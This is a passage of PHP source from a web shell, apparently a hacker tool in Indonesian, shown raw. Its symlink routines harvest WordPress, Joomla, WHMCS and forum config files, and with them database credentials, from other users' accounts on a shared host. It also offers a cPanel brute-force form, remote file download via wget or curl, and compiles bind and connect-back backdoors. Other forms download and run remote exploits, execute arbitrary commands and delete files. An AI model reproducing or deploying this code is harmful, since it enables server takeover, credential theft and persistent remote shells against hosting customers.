		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>Done</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>Done</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>Here</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
<input name="page" type="hidden" value="find">
	<table border=1>
	<body bgcolor="black" text="white"><br><br>
    
	<center><b><font size="5" style="italic" color="white">Cpanel BruteForce<br><br></b></center></td></tr>
    <tr>
    <td>
	<strong>User :</strong>
	</td>
	<td>
	<strong><textarea cols="79" style="background:black;outline:none;color:white;" rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong>
    </td>
    <tr>
    <td>
	<strong>Pass :</strong>
	</td>
	<td>
    <strong><textarea cols="79" style="background:black;outline:none;color:white;" rows="10" name="passwords"></textarea></strong>
	</td>
    </tr>
    <tr>
    <td>
	<strong>Type :</strong>
	</td>
    <td>
    <span style="background:black;outline:none;color:white;"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font style="background:black;outline:none;color:white;"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" style="background:black;outline:none;color:white;"></strong><span class="style3"><strong>
	</strong>
	</span>
    <td style="background:black;outline:none;color:white;"  >
    <strong><input class ='inputzbut' type="submit" value="START"></strong>
    </td>
    </tr>
	</table>
	<br>
	<table border=1>
    <tr> 
    <td valign="top" style="background:black;outline:none;color:white;" >
		<strong>Get Config</strong>
		<br>
		<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd" >        				
    </strong>
    <strong>Folder Name :</strong>
			<td>
				
	<strong><input style="background:black;outline:none;color:white;" size="80" name="foldername" type="text"></strong>
    <td style="background:black;outline:none;color:white;"  >
		<strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td style="background:black;outline:none;color:white;">
		<strong>Get Wordlist</strong>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <strong>Url Config :</strong>
	<td>
		
    <strong>
		<input style="background:black;outline:none;color:white;" size="80" name="url" type="text"></strong>
	
    <td style="background:black;outline:none;color:white;"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
	<td style="background:black;outline:none;color:white;" colspan="6">
	<strong>Info Security</strong></td>
    				</tr>
    <tr>
    <td style="background:black;outline:none;color:white;" style="width: 139px"><strong>Safe Mode</strong></td>
    <td style="background:black;outline:none;color:white;" colspan="5">
	<strong>
<?php
}
///
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=about" method="post">
    <br><br><br><center>
						<br>Hai? :)<br>
						Gw cuma mau nanya, kenapa si cuma shell aja di taro logger?
						gak suka? contact : kapaljetz666@hotmail.com :)
<br>fuck you<br>
						</div>
<?php
}
//////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){ 
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$path = magicboom($_POST['path']);
	$namafile = download($pilihan,$wurl);
	$pindah = $path.$namafile;
	if(is_file($pindah)) {
		$msg = "file uploaded to $pindah";
	}
	else $msg = "failed to upload $namafile";

}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:#FFFF00;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from url</th></tr>
<tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){ 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" readonly>
<?php
if(isset($_POST['submitcmd'])) {
	echo @exe($_POST['cmd']);
}
?>
</textarea>
<tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table>
</form>
<?php } 
else { 
if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	@unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
	@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd.$_GET['mkdir'];
	@mkdir($path);
}
	$buff = showdir($pwd,$prompt);
	echo $buff;
}
?>

<br>
<br>
<center>
<br><center><br><br><div class="info">$ Art is the Soul that Moves through the Media $</div><br>
<div class="jaya"><b>
<script language="JavaScript"> Year=new Date(); var copyright=Year.getUTCFullYear(); document.write("&copy; Jembut Loyality - " + copyright); </script>
<b></div></center><br><br>
</div>
</body>
</html>
</html>
